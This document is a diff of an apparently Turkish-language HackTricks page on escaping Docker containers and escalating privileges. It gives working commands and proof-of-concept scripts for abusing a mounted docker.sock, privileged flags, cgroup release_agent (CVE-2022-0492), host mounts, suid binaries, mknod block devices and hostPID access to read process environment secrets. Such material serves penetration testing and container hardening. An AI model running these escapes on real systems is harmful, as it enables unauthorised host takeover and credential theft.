@@ -1,16 +1,16 @@
-# Docker Kaçışı / Ayrıcalık Yükseltme
+# Docker Breakout / Privilege Escalation
 
 {% hint style="success" %}
-AWS Hacking'i öğrenin ve uygulayın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-GCP Hacking'i öğrenin ve uygulayın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>HackTricks'i Destekleyin</summary>
 
-* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
-* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katılın veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
-* **Hacking püf noktalarını paylaşarak PR göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.
+* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
+* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
+* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.
 
 </details>
 {% endhint %}
@@ -18,29 +18,29 @@ GCP Hacking'i öğrenin ve uygulayın: <img src="/.gitbook/assets/grte.png" alt=
 <figure><img src="../../../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-[**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=docker-breakout-privilege-escalation) kullanarak dünyanın **en gelişmiş** topluluk araçları tarafından desteklenen iş akışlarını kolayca oluşturun ve **otomatikleştirin**.\
+[**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=docker-breakout-privilege-escalation) kullanarak dünyanın **en gelişmiş** topluluk araçlarıyla desteklenen **iş akışlarını** kolayca oluşturun ve **otomatikleştirin**.\
 Bugün Erişim Alın:
 
 {% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=docker-breakout-privilege-escalation" %}
 
-## Otomatik Numaralandırma ve Kaçış
+## Otomatik Sayım & Kaçış
 
-* [**linpeas**](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS): Ayrıca **konteynerleri numaralandırabilir**
-* [**CDK**](https://github.com/cdk-team/CDK#installationdelivery): Bu araç, içinde bulunduğunuz konteyneri numaralandırmak için oldukça **yararlıdır ve hatta otomatik olarak kaçmaya çalışır**
-* [**amicontained**](https://github.com/genuinetools/amicontained): Kaçmak için yollar bulmak için konteynerin sahip olduğu ayrıcalıkları almanıza yardımcı olan faydalı bir araç
-* [**deepce**](https://github.com/stealthcopter/deepce): Konteynerlerden numaralandırmak ve kaçmak için araç
-* [**grype**](https://github.com/anchore/grype): Görüntüye yüklenen yazılımda bulunan CVE'leri alın
+* [**linpeas**](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS): Ayrıca **konteynerleri sayabilir**
+* [**CDK**](https://github.com/cdk-team/CDK#installationdelivery): Bu araç, bulunduğunuz konteyneri saymak ve otomatik olarak kaçış denemek için oldukça **yararlıdır**
+* [**amicontained**](https://github.com/genuinetools/amicontained): Kaçış yollarını bulmak için konteynerin sahip olduğu ayrıcalıkları almak için yararlı bir araç
+* [**deepce**](https://github.com/stealthcopter/deepce): Konteynerlerden sayım yapmak ve kaçış sağlamak için bir araç
+* [**grype**](https://github.com/anchore/grype): Görüntüde yüklü yazılımda bulunan CVE'leri alın
 
-## Bağlanmış Docker Soketinden Kaçış
+## Montelenmiş Docker Soketi Kaçışı
 
-Eğer bir şekilde **docker soketinin** docker konteyneri içine bağlandığını bulursanız, bundan kaçabilirsiniz.\
-Bu genellikle, bir nedenle docker işlemlerini gerçekleştirmek için docker daemon'a bağlanması gereken docker konteynerlerinde meydana gelir.
+Eğer bir şekilde **docker soketinin** docker konteyneri içinde montelenmiş olduğunu bulursanız, oradan kaçış yapabileceksiniz.\
+Bu genellikle bazı nedenlerden dolayı docker daemon'a bağlanması gereken docker konteynerlerinde olur.
 ```bash
 #Search the socket
 find / -name docker.sock 2>/dev/null
 #It's usually in /run/docker.sock
 ```
-Bu durumda, docker daemon ile iletişim kurmak için düzenli docker komutlarını kullanabilirsiniz:
+Bu durumda, docker daemon ile iletişim kurmak için normal docker komutlarını kullanabilirsiniz:
 ```bash
 #List images to use one
 docker images
@@ -55,13 +55,13 @@ nsenter --target 1 --mount --uts --ipc --net --pid -- bash
 docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --security-opt seccomp=unconfined --security-opt label:disable --pid=host --userns=host --uts=host --cgroupns=host ubuntu chroot /host/ bash
 ```
 {% hint style="info" %}
-Eğer **docker soketi beklenmedik bir yerde** bulunuyorsa, yine de **`docker`** komutunu **`-H unix:///path/to/docker.sock`** parametresi ile kullanarak iletişim kurabilirsiniz.
+Eğer **docker soketi beklenmedik bir yerdeyse**, yine de **`docker`** komutunu **`-H unix:///path/to/docker.sock`** parametresi ile kullanarak onunla iletişim kurabilirsiniz.
 {% endhint %}
 
-Docker daemon ayrıca bir portta da dinleyebilir (varsayılan olarak 2375, 2376) veya Systemd tabanlı sistemlerde Docker daemon ile iletişim Systemd soketi `fd://` üzerinden gerçekleşebilir.
+Docker daemon ayrıca [bir portta dinliyor olabilir (varsayılan olarak 2375, 2376)](../../../../network-services-pentesting/2375-pentesting-docker.md) veya Systemd tabanlı sistemlerde, Docker daemon ile iletişim Systemd soketi `fd://` üzerinden gerçekleşebilir.
 
 {% hint style="info" %}
-Ayrıca, diğer yüksek seviye çalışma zamanlarının çalışma soketlerine dikkat edin:
+Ayrıca, diğer yüksek seviyeli çalışma zamanlarının çalışma zamanı soketlerine dikkat edin:
 
 * dockershim: `unix:///var/run/dockershim.sock`
 * containerd: `unix:///run/containerd/containerd.sock`
@@ -71,23 +71,23 @@ Ayrıca, diğer yüksek seviye çalışma zamanlarının çalışma soketlerine 
 * ...
 {% endhint %}
 
-## Yeteneklerin Kötüye Kullanımından Kaçınma
+## Yetki Kötüye Kullanımı Kaçışı
 
-Konteynerin yeteneklerini kontrol etmelisiniz, eğer aşağıdaki yeteneklerden herhangi birine sahipse, ondan kaçabilirsiniz: **`CAP_SYS_ADMIN`**, **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE, CAP_SYS_RAWIO`, `CAP_SYSLOG`, `CAP_NET_RAW`, `CAP_NET_ADMIN`**
+Konteynerin yetkilerini kontrol etmelisiniz, eğer aşağıdakilerden herhangi birine sahipse, ondan kaçış yapabilirsiniz: **`CAP_SYS_ADMIN`**_,_ **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE, CAP_SYS_RAWIO`, `CAP_SYSLOG`, `CAP_NET_RAW`, `CAP_NET_ADMIN`**
 
-Şu anda konteyner yeteneklerini kontrol edebilirsiniz **daha önce bahsedilen otomatik araçlar** veya:
+Mevcut konteyner yetkilerini **daha önce bahsedilen otomatik araçlar** ile veya kontrol edebilirsiniz:
 ```bash
 capsh --print
 ```
-Aşağıdaki sayfada **linux yetenekleri** hakkında daha fazla bilgi edinebilir ve bunları kötüye kullanarak ayrıcalıklardan kaçınabilir/aitalabilirsiniz:
+Aşağıdaki sayfada **linux yetenekleri hakkında daha fazla bilgi edinebilir** ve bunları nasıl kötüye kullanacağınızı öğrenebilirsiniz:
 
 {% content-ref url="../../linux-capabilities.md" %}
 [linux-capabilities.md](../../linux-capabilities.md)
 {% endcontent-ref %}
 
-## Ayrıcalıklı Konteynerden Kaçış
+## Ayrıcalıklı Konteynerlerden Kaçış
 
-Ayrıcalıklı bir konteyner, `--privileged` bayrağı eklenerek veya belirli savunmalar devre dışı bırakılarak oluşturulabilir:
+Ayrıcalıklı bir konteyner, `--privileged` bayrağı ile veya belirli savunmaları devre dışı bırakarak oluşturulabilir:
 
 * `--cap-add=ALL`
 * `--security-opt apparmor=unconfined`
@@ -97,46 +97,46 @@ Ayrıcalıklı bir konteyner, `--privileged` bayrağı eklenerek veya belirli sa
 * `--userns=host`
 * `--uts=host`
 * `--cgroupns=host`
-* `/dev` bağlama
+* `Mount /dev`
 
-`--privileged` bayrağı, konteyner güvenliğini önemli ölçüde düşürür, **sınırsız cihaz erişimi** sunar ve **birçok korumayı atlar**. Detaylı bir açıklama için, `--privileged`'ın tam etkileri hakkındaki belgelendirmeye başvurun.
+`--privileged` bayrağı, konteyner güvenliğini önemli ölçüde azaltır, **sınırsız cihaz erişimi** sunar ve **birçok korumayı** atlatır. Ayrıntılı bir inceleme için, `--privileged`'in tam etkileri hakkında belgeleri inceleyin.
 
 {% content-ref url="../docker-privileged.md" %}
 [docker-privileged.md](../docker-privileged.md)
 {% endcontent-ref %}
 
-### Privileged + hostPID
+### Ayrıcalıklı + hostPID
 
-Bu izinlerle sadece **kök olarak çalışan bir işlem alanına geçebilirsiniz** örneğin init (pid:1) gibi, sadece şunu çalıştırarak: `nsenter --target 1 --mount --uts --ipc --net --pid -- bash`
+Bu izinlerle, sadece **root olarak ana makinede çalışan bir sürecin ad alanına geçebilirsiniz**; örneğin init (pid:1) sadece şunu çalıştırarak: `nsenter --target 1 --mount --uts --ipc --net --pid -- bash`
 
-Bunu bir konteynerde test ederek gerçekleştirin:
+Bunu bir konteynerde test edin:
 ```bash
 docker run --rm -it --pid=host --privileged ubuntu bash
 ```
-### Ayrıcalıklı
+### Privileged
 
-Sadece ayrıcalıklı bayrağı ile **ana bilgisayarın diskinde erişmeyi** veya **release\_agent veya diğer kaçışları kötüye kullanarak kaçmayı** deneyebilirsiniz.
+Sadece yetkili bayrağı ile **ana bilgisayarın diskine erişmeye** veya **release\_agent veya diğer kaçışları kötüye kullanarak kaçmaya** çalışabilirsiniz.
 
-Aşağıdaki atlamaları bir konteynerde test edin:
+Aşağıdaki atlatmaları bir konteynerde çalıştırarak test edin:
 ```bash
 docker run --rm -it --privileged ubuntu bash
 ```
-#### Diski Bağlama - Poc1
+#### Mounting Disk - Poc1
 
-İyi yapılandırılmış docker konteynerleri **fdisk -l** gibi komutlara izin vermez. Ancak yanlış yapılandırılmış bir docker komutunda `--privileged` veya `--device=/dev/sda1` bayrağı büyük harflerle belirtildiğinde, ana sürücüyü görmek için ayrıcalıklara sahip olmak mümkündür.
+İyi yapılandırılmış docker konteynerleri **fdisk -l** gibi komutlara izin vermez. Ancak, `--privileged` veya büyük harfle belirtilmiş `--device=/dev/sda1` bayrağı ile yanlış yapılandırılmış docker komutlarında, ana makine sürücüsünü görme ayrıcalıklarını elde etmek mümkündür.
 
 ![](https://bestestredteam.com/content/images/2019/08/image-16.png)
 
-Bu nedenle ana makineyi ele geçirmek basittir:
+Bu nedenle ana makineyi ele geçirmek oldukça basittir:
 ```bash
 mkdir -p /mnt/hola
 mount /dev/sda1 /mnt/hola
 ```
-Ve işte! Artık ana bilgisayarın dosya sistemine `/mnt/hola` klasöründe bağlanabilirsiniz.
+Ve voilà! Artık `/mnt/hola` klasöründe monte edildiği için ana bilgisayarın dosya sistemine erişebilirsiniz.
 
-#### Disk Bağlama - Poc2
+#### Disk Montajı - Poc2
 
-Kapsayıcı içinde, bir saldırgan kümenin oluşturduğu yazılabilir hostPath birimini kullanarak altta yatan ana bilgisayar işletim sistemine daha fazla erişim elde etmeye çalışabilir. Aşağıda, bu saldırgan vektörünü kullanarak kontrol edebileceğiniz yaygın bazı şeyler bulunmaktadır:
+Konteyner içinde, bir saldırgan, küme tarafından oluşturulan yazılabilir bir hostPath hacmi aracılığıyla altındaki ana işletim sistemine daha fazla erişim sağlamaya çalışabilir. Aşağıda, bu saldırgan vektörünü kullanıp kullanamayacağınızı görmek için konteyner içinde kontrol edebileceğiniz bazı yaygın şeyler bulunmaktadır:
 ```bash
 ### Check if You Can Write to a File-system
 echo 1 > /proc/sysrq-trigger
@@ -157,9 +157,9 @@ mount: /mnt: permission denied. ---> Failed! but if not, you may have access to 
 ### debugfs (Interactive File System Debugger)
 debugfs /dev/sda1
 ```
-#### Ayrıcalıklı Kaçış Var Olan release\_agent Kullanımı ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC1
+#### Yetki Kaçışı Mevcut release\_agent'i Kötüye Kullanma ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC1
 
-{% code title="İlk PoC" %}
+{% code title="Başlangıç PoC" %}
 ```bash
 # spawn a new container to exploit via:
 # docker run --rm -it --privileged ubuntu bash
@@ -193,7 +193,11 @@ sh -c "echo 0 > $d/w/cgroup.procs"; sleep 1
 # Reads the output
 cat /o
 ```
-#### Oluşturulan release_agent'i Kullanarak Ayrıcalıklı Kaçış ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC2
+{% endcode %}
+
+#### Yetkili Kaçış Oluşturulan release\_agent'i Kötüye Kullanma ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC2
+
+{% code title="İkinci PoC" %}
 ```bash
 # On the host
 docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
@@ -237,15 +241,15 @@ cat /output
 ```
 {% endcode %}
 
-**Teknik açıklamanın** bulunduğu yere bakın:
+Bir **teknik açıklaması** bulmak için:
 
 {% content-ref url="docker-release_agent-cgroups-escape.md" %}
 [docker-release\_agent-cgroups-escape.md](docker-release\_agent-cgroups-escape.md)
 {% endcontent-ref %}
 
-#### Bilinen yol olmadan release\_agent'i kötüye kullanarak Yetkilendirilmiş Kaçış - PoC3
+#### Bilinmeyen göreceli yol ile release\_agent'i kötüye kullanarak ayrıcalıklı kaçış - PoC3
 
-Önceki saldırılarda **konumunun kesin yolu** açıklanmıştır. Bununla birlikte, her zaman böyle olmaz. **Ana bilgisayar içindeki konteynerin kesin yolunu bilmediğiniz durumlarda** bu tekniği kullanabilirsiniz:
+Önceki istismarlar, **konteynerin ana bilgisayarın dosya sistemindeki mutlak yolunu ifşa eder**. Ancak, bu her zaman böyle değildir. Ana bilgisayar içindeki **konteynerin mutlak yolunu bilmediğiniz durumlarda** bu tekniği kullanabilirsiniz:
 
 {% content-ref url="release_agent-exploit-relative-paths-to-pids.md" %}
 [release\_agent-exploit-relative-paths-to-pids.md](release\_agent-exploit-relative-paths-to-pids.md)
@@ -309,7 +313,7 @@ sleep 1
 echo "Done! Output:"
 cat ${OUTPUT_PATH}
 ```
-İçinde ayrıcalıklı bir konteynerde PoC'yi çalıştırmak benzer bir çıktı sağlamalıdır:
+Yetkili bir konteyner içinde PoC'yi çalıştırmak, aşağıdaki gibi bir çıktı sağlamalıdır:
 ```bash
 root@container:~$ ./release_agent_pid_brute.sh
 Checking pid 100
@@ -337,33 +341,33 @@ root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
 root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
 ...
 ```
-#### Ayrıcalıklı Kaçış Hassas Bağlantıları Kötüye Kullanma
+#### Ayrıcalıklı Kaçış Hassas Montajların İstismarı
 
-Altta yatan ana bilgisayar hakkında bilgi veren **çeşitli dosyalar** bağlanabilir. Bazıları, hatta **ana bilgisayar tarafından bir şeyin gerçekleştiğinde yürütülmesi gerektiğini belirtebilir** (bu da bir saldırganın konteynerden kaçmasına izin verebilir).\
-Bu dosyaların kötüye kullanımı şunu mümkün kılar:
+Montaj yapılmış birkaç dosya vardır ki bunlar **altındaki ana makine hakkında bilgi verir**. Bunlardan bazıları, **bir şey olduğunda ana makine tarafından yürütülecek bir şeyi gösterebilir** (bu, bir saldırganın konteynerden kaçmasına izin verecektir).\
+Bu dosyaların istismarı şunları mümkün kılabilir:
 
-* release\_agent (önceden ele alındı)
+* release\_agent (daha önce ele alındı)
 * [binfmt\_misc](sensitive-mounts.md#proc-sys-fs-binfmt\_misc)
 * [core\_pattern](sensitive-mounts.md#proc-sys-kernel-core\_pattern)
 * [uevent\_helper](sensitive-mounts.md#sys-kernel-uevent\_helper)
 * [modprobe](sensitive-mounts.md#proc-sys-kernel-modprobe)
 
-Ancak, bu sayfada kontrol etmek için **diğer hassas dosyaları** bulabilirsiniz:
+Ancak, bu sayfada kontrol edilecek **diğer hassas dosyalar** bulabilirsiniz:
 
 {% content-ref url="sensitive-mounts.md" %}
 [sensitive-mounts.md](sensitive-mounts.md)
 {% endcontent-ref %}
 
-### Keyfi Bağlantılar
+### Keyfi Montajlar
 
-Birkaç durumda, **konteynerin ana bilgisayardan birim bağlandığını** göreceksiniz. Bu birim doğru yapılandırılmamışsa, **duyarlı verilere erişebilir/değiştirebilirsiniz**: Gizli bilgileri okuyun, ssh authorized\_keys dosyasını değiştirin...
+Birçok durumda, **konteynerin ana makineden bazı hacimlerin montajlı olduğunu** göreceksiniz. Eğer bu hacim doğru bir şekilde yapılandırılmamışsa, **hassas verilere erişim/değişiklik yapma** imkanınız olabilir: Gizli bilgileri okuyun, ssh authorized\_keys'i değiştirin…
 ```bash
 docker run --rm -it -v /:/host ubuntu bash
 ```
-### 2 kabuk ve ana bilgisayar bağlama ile ayrıcalık yükseltme
+### İki shell ve host mount ile Yetki Yükseltme
 
-Eğer **ana bilgisayar tarafından bağlanmış bir klasöre sahip bir konteyner içinde root erişiminiz varsa** ve **ana bilgisayar üzerinde ayrıcalıklı olmayan bir kullanıcı olarak kaçmayı başardıysanız** ve bağlanmış klasöre okuma erişiminiz varsa.\
-**Konteyner** içinde **bağlanmış klasörde bir bash suid dosyası oluşturabilir** ve bunu **ana bilgisayar üzerinden çalıştırarak ayrıcalık yükseltebilirsiniz**.
+Eğer bir **konteyner içinde root erişiminiz** varsa ve host'tan mount edilmiş bir klasör varsa ve **host'a yetkisiz bir kullanıcı olarak kaçtıysanız** ve mount edilmiş klasör üzerinde okuma erişiminiz varsa.\
+Konteyner içindeki **mount edilmiş klasörde** bir **bash suid dosyası** oluşturabilir ve **host'tan çalıştırarak** yetki yükseltebilirsiniz.
 ```bash
 cp /bin/bash . #From non priv inside mounted folder
 # You need to copy it from the host as the bash binaries might be diferent in the host and in the container
@@ -371,13 +375,14 @@ chown root:root bash #From container as root inside mounted folder
 chmod 4777 bash #From container as root inside mounted folder
 bash -p #From non priv inside mounted folder
 ```
-### 2 kabuk ile Yetki Yükseltme
+### İki Shell ile Yetki Yükseltme
 
-Eğer bir konteyner içinde **root erişiminiz** varsa ve **özneleşmiş bir kullanıcı olarak ana makineye kaçtıysanız**, konteyner içinde MKNOD yeteneğine sahipseniz (varsayılan olarak vardır) her iki kabuğu da kötüye kullanarak ana makinede **yetki yükseltebilirsiniz**. Bu yetenekle, konteyner içindeki root kullanıcısına **blok cihaz dosyaları oluşturma** izni verilir. Cihaz dosyaları, **altta yatan donanıma ve çekirdek modüllerine erişmek** için kullanılan özel dosyalardır. Örneğin, /dev/sda blok cihaz dosyası, **sistem diskindeki ham verileri okuma** izni verir.
+Eğer bir **konteyner içinde root olarak erişiminiz** varsa ve **host'a yetkisiz bir kullanıcı olarak kaçtıysanız**, her iki shell'i de **host içinde privesc için kötüye kullanabilirsiniz** eğer konteyner içinde MKNOD yeteneğine sahipseniz (varsayılan olarak vardır) [**bu yazıda açıklandığı gibi**](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/).\
+Bu yetenekle konteyner içindeki root kullanıcısı **blok cihaz dosyaları oluşturma** iznine sahiptir. Cihaz dosyaları, **temel donanım ve çekirdek modüllerine erişmek için** kullanılan özel dosyalardır. Örneğin, /dev/sda blok cihaz dosyası, **sistem diskindeki ham verilere erişim sağlar**.
 
-Docker, konteynerler içinde blok cihazlarının yanlış kullanımına karşı koruma sağlar, blok cihazı okuma/yazma işlemlerini engelleyen bir cgroup politikasını **uygular**. Bununla birlikte, bir blok cihazı **konteyner içinde oluşturulursa**, dışarıdan **/proc/PID/root/** dizini aracılığıyla erişilebilir hale gelir. Bu erişim, iç ve dış konteynerdeki **işlem sahibinin aynı olmasını** gerektirir.
+Docker, konteynerler içinde blok cihaz kötüye kullanımına karşı, **blok cihazı okuma/yazma işlemlerini engelleyen** bir cgroup politikası uygulayarak koruma sağlar. Ancak, eğer bir blok cihaz **konteyner içinde oluşturulursa**, bu cihaz konteyner dışından **/proc/PID/root/** dizini aracılığıyla erişilebilir hale gelir. Bu erişim, **işlem sahibinin hem konteyner içinde hem de dışında aynı olması** gerektirir.
 
-Bu [**yazıda**](https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames/) verilen **sömürü** örneği:
+**Sömürü** örneği bu [**yazıdan**](https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames/):
 ```bash
 # On the container as root
 cd /
@@ -415,13 +420,13 @@ HTB{7h4T_w45_Tr1cKy_1_D4r3_54y}
 ```
 ### hostPID
 
-Eğer ana makinenin işlemlerine erişebilirseniz, bu işlemlerde saklanan birçok hassas bilgiye erişebileceksiniz demektir. Test laboratuvarını çalıştırın:
+Eğer ana makinenin süreçlerine erişiminiz varsa, bu süreçlerde saklanan birçok hassas bilgiye erişebileceksiniz. Test laboratuvarını çalıştırın:
 ```
 docker run --rm -it --pid=host ubuntu bash
 ```
-Örneğin, `ps auxn` gibi bir şey kullanarak süreçleri listeleyebilecek ve komutlardaki hassas detayları arayabileceksiniz.
+Örneğin, `ps auxn` gibi bir şey kullanarak süreçleri listeleyebilir ve komutlarda hassas ayrıntıları arayabilirsiniz.
 
-Ardından, **/proc/ içindeki ana bilgisayarın her bir sürecine erişebileceğiniz için sadece çevre sırlarını çalabilirsiniz** çalıştırarak:
+Sonra, **/proc/ içindeki her bir host sürecine erişebildiğiniz için, sadece env gizli anahtarlarını çalabilirsiniz**:
 ```bash
 for e in `ls /proc/*/environ`; do echo; echo $e; xargs -0 -L1 -a $e; done
 /proc/988058/environ
@@ -430,7 +435,7 @@ HOSTNAME=argocd-server-69678b4f65-6mmql
 USER=abrgocd
 ...
 ```
-Ayrıca **diğer işlemlerin dosya tanımlayıcılarına erişebilir ve açık dosyalarını okuyabilirsiniz**:
+Diğer süreçlerin dosya tanımlayıcılarına da **erişebilir ve açık dosyalarını okuyabilirsiniz**:
 ```bash
 for fd in `find /proc/*/fd`; do ls -al $fd/* 2>/dev/null | grep \>; done > fds.txt
 less fds.txt
@@ -440,85 +445,85 @@ lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/4 -> /.secret.txt.swp
 # You can open the secret filw with:
 cat /proc/635813/fd/4
 ```
-Ayrıca **işlemleri sonlandırabilir ve Bir Hizmet Reddine (DoS) neden olabilirsiniz**.
+You can also **kill processes and cause a DoS**.
 
 {% hint style="warning" %}
-Eğer bir şekilde **konteyner dışındaki bir işlem üzerinde ayrıcalıklı erişiminiz varsa**, `nsenter --target <pid> --all` veya `nsenter --target <pid> --mount --net --pid --cgroup` gibi bir şey çalıştırabilir ve **umarım olmayan** aynı ns kısıtlamalarına sahip bir kabuk çalıştırabilirsiniz.
+Eğer bir şekilde **kapsayıcı dışındaki bir süreç üzerinde ayrıcalıklı erişiminiz varsa**, `nsenter --target <pid> --all` veya `nsenter --target <pid> --mount --net --pid --cgroup` gibi bir şey çalıştırarak **o süreçle aynı ns kısıtlamalarıyla** (umarım hiç yok) **bir shell çalıştırabilirsiniz.**
 {% endhint %}
 
 ### hostNetwork
 ```
 docker run --rm -it --network=host ubuntu bash
 ```
-Eğer bir konteyner Docker [ana ağ sürücüsüyle yapılandırılmışsa (`--network=host`)](https://docs.docker.com/network/host/), o konteynerin ağ yığını Docker ana bilgisayarından izole edilmez (konteyner ana bilgisayarın ağ ad alanını paylaşır) ve konteynerin ayrılmış bir IP adresi tahsis edilmez. Başka bir deyişle, **konteyner tüm hizmetleri doğrudan ana bilgisayarın IP'sine bağlar**. Ayrıca konteyner, paylaşılan arayüz üzerinde ana bilgisayarın gönderdiği ve aldığı **TÜM ağ trafiğini yakalayabilir `tcpdump -i eth0`**.
+Eğer bir konteyner Docker [host networking driver (`--network=host`)](https://docs.docker.com/network/host/) ile yapılandırılmışsa, o konteynerin ağ yığını Docker ana bilgisayarından izole değildir (konteyner, ana bilgisayarın ağ ad alanını paylaşır) ve konteynerin kendi IP adresi tahsis edilmez. Diğer bir deyişle, **konteyner tüm hizmetleri doğrudan ana bilgisayarın IP'sine bağlar**. Dahası, konteyner **ana bilgisayarın** gönderdiği ve aldığı tüm ağ trafiğini **yakalayabilir** ve **manipüle edebilir** `tcpdump -i eth0`.
 
-Örneğin, bunu kullanarak ana bilgisayar ve meta veri örneği arasındaki trafiği **dinleyebilir ve hatta sahtekarlık yapabilirsiniz**.
+Örneğin, bunu **ana bilgisayar ile metadata örneği arasındaki trafiği yakalamak ve hatta sahte trafiği oluşturmak için** kullanabilirsiniz.
 
 Aşağıdaki örneklerde olduğu gibi:
 
-* [Açıklama: Google SRE ile nasıl iletişime geçilir: Bulut SQL'de bir kabuk bırakma](https://offensi.com/2020/08/18/how-to-contact-google-sre-dropping-a-shell-in-cloud-sql/)
-* [Meta veri servisi MITM, kök ayrıcalık yükseltmesine izin verir (EKS / GKE)](https://blog.champtar.fr/Metadata\_MITM\_root\_EKS\_GKE/)
+* [Writeup: How to contact Google SRE: Dropping a shell in cloud SQL](https://offensi.com/2020/08/18/how-to-contact-google-sre-dropping-a-shell-in-cloud-sql/)
+* [Metadata service MITM allows root privilege escalation (EKS / GKE)](https://blog.champtar.fr/Metadata\_MITM\_root\_EKS\_GKE/)
 
-Ayrıca ana bilgisayar içinde **localhost'a bağlı ağ hizmetlerine erişebilecek** veya hatta **düğümün meta veri izinlerine** erişebileceksiniz (bu, bir konteynerin erişebileceğinden farklı olabilir). 
+Ayrıca, ana bilgisayar içindeki **localhost'a bağlı ağ hizmetlerine** erişebilecek veya **düğümün metadata izinlerine** (bir konteynerin erişebileceğinden farklı olabilir) erişebileceksiniz.
 
 ### hostIPC
 ```bash
 docker run --rm -it --ipc=host ubuntu bash
 ```
-`hostIPC=true` ile, ana bilgisayarın ara işlem iletişimi (IPC) kaynaklarına, örneğin `/dev/shm` içindeki **paylaşılan bellek** gibi, erişim elde edersiniz. Bu, aynı IPC kaynaklarının diğer ana bilgisayar veya kapsül süreçleri tarafından kullanıldığı yerlerde okuma/yazma yapmanıza olanak tanır. Bu IPC mekanizmalarını daha ayrıntılı incelemek için `ipcs` komutunu kullanın.
+`hostIPC=true` ile, ana bilgisayarın süreçler arası iletişim (IPC) kaynaklarına, örneğin `/dev/shm` içindeki **paylaşılan bellek** kaynaklarına erişim kazanırsınız. Bu, diğer ana bilgisayar veya pod süreçleri tarafından kullanılan aynı IPC kaynaklarının okuma/yazma işlemlerini sağlar. Bu IPC mekanizmalarını daha ayrıntılı incelemek için `ipcs` komutunu kullanın.
 
-* **/dev/shm'yi İncele** - Bu paylaşılan bellek konumunda herhangi bir dosyayı arayın: `ls -la /dev/shm`
-* **Mevcut IPC tesislerini İncele** - Kullanılan herhangi bir IPC tesisinin olup olmadığını kontrol edebilirsiniz `/usr/bin/ipcs` ile. Şunu kontrol edin: `ipcs -a`
+* **/dev/shm'yi incele** - Bu paylaşılan bellek konumundaki dosyaları kontrol edin: `ls -la /dev/shm`
+* **Mevcut IPC tesislerini incele** – Herhangi bir IPC tesisinin kullanılıp kullanılmadığını kontrol etmek için `/usr/bin/ipcs` komutunu kullanabilirsiniz. Bunu kontrol edin: `ipcs -a`
 
-### Yetenekleri Kurtar
+### Yetenekleri geri kazanma
 
-Eğer **`unshare`** sistem çağrısı yasaklanmamışsa, tüm yetenekleri kurtarabilirsiniz:
+Eğer sistem çağrısı **`unshare`** yasaklanmamışsa, tüm yetenekleri geri kazanabilirsiniz:
 ```bash
 unshare -UrmCpf bash
 # Check them with
 cat /proc/self/status | grep CapEff
 ```
-### Kullanıcı ad alanı kötüye kullanımı simge bağlantısı aracılığıyla
+### Kullanıcı ad alanı istismarı yoluyla symlink
 
-[https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/) adresinde açıklanan ikinci teknik, kullanıcı ad alanlarıyla bağlantılı bağ montajlarını kötüye kullanarak ana makinedeki dosyaları etkilemenize (belirli bir durumda dosyaları silmenize) olanak tanır.
